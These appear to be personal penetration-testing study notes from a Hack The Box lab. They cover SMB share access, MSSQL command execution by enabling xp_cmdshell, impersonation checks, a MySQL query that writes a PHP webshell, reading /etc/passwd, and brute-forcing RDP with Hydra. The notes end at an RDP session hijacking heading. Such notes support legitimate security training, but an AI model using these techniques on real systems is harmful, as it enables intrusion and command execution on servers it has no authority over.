# SMB
already done previously.

In windows example with DIR

    C:\htb> dir \\192.168.220.129\Finance\

In windows example with net use

    net use n: \\192.168.220.129\Finance

We can add the password in it as well.

    net use n: \\192.168.220.129\Finance /user:plaintext Password123

Using Powershell

    Get-ChildItem \\192.168.220.129\Finance\
using new-PSDrive instead of net use 

    New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

With password, it's getting quite complicated 

    PS C:\htb> $username = 'plaintext'
    PS C:\htb> $password = 'Password123'
    PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
    PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Using Linux we can use the mount command.
We create a mount directory and mount the samba share.

    MysterPedro@htb[/htb]$ sudo mkdir /mnt/Finance
    MysterPedro@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# Databases:
## MSSQL


Best use dbeaver, I think it's great to have a database GUI.
or in command line linux use : 

    sqsh -S 10.129.20.13 -U username -P Password123
    mssqlclient.py -p 1433 julio@10.129.203.7 

Windows:

    sqlcmd -S 10.129.20.13 -U username -P Password123

in MSSQL we can execute cmd command  with xp_cmdshell example:

    1> xp_cmdshell 'whoami'
    2> GO

    output
    -----------------------------
    no service\mssql$sqlexpress
    NULL
    (2 rows affected)

if it's not activated, we ca do so :

    -- To allow advanced options to be changed.  
    EXECUTE sp_configure 'show advanced options', 1
    GO

    -- To update the currently configured value for advanced options.  
    RECONFIGURE
    GO  

    -- To enable the feature.  
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO  

    -- To update the currently configured value for this feature.  
    RECONFIGURE
    GO

Impersonate Existing Users with MSSQL

    1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' GO

    name
    -----------------------------------------------
    sa
    ben
    valentin

    (3 rows affected)

## MYSQL

Regarding mysql we can write a shell into a web file for example:

    mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

    Query OK, 1 row affected (0.001 sec)

Sometimes it's restricted; to check whether it's doable or not:

    show variables like "secure_file_priv";

to read a file 

    mysql> select LOAD_FILE("/etc/passwd");

## RDP : remote desktop protocol

s a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection on port 3389

it can be brute forced with Hydra

    hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

RDP Session Hijacking